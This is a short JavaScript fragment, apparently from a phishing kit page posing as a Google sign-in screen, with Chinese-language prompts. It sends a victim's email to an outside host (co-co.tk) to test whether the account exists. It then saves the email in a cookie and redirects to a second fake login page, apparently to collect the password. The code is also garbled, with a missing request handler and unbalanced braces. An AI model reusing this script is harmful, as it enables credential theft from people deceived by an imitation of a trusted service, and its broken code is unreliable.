<script>
	var ddddd = "null";

	function callto() {

			document.getElementById("DDFo").innerHTML = "請輸入電子郵件地址或電話號碼";

			var xhttp = new XMLHttpRequest();

					if(this.readyState == 4 && this.status == 200) {
						if(this.responseText=="Y") {
							cango();
						} else {
							document.getElementById("jjjjjaaaaaooooo").className += " k0tWj IYewr";
							document.getElementById("DDFo").innerHTML = "找不到您的 Google 帳戶";

			xhttp.open("GET", "https://co-co.tk/test/GoogleCheck/?email="+ddddd, true);
			xhttp.send();
		}
	}
	function urldata(key) {
		var u = location.href;
		var n = key.length;
		var i = u.search(key)+n+1;
		var a = "";
		while(u.charAt(i)!=""&&u.charAt(i)!="&") {
			a += u.charAt(i);
			++i;
		}
		return a;
	}
	function cango() {
		Cookies.set('email', ddddd);
		if(!urldata("redirect")) {
			window.location.href="./GoogleLogin2.htm";
		} else {
			window.location.href="./GoogleLogin2.htm?redirect="+urldata("redirect");
		}
	}
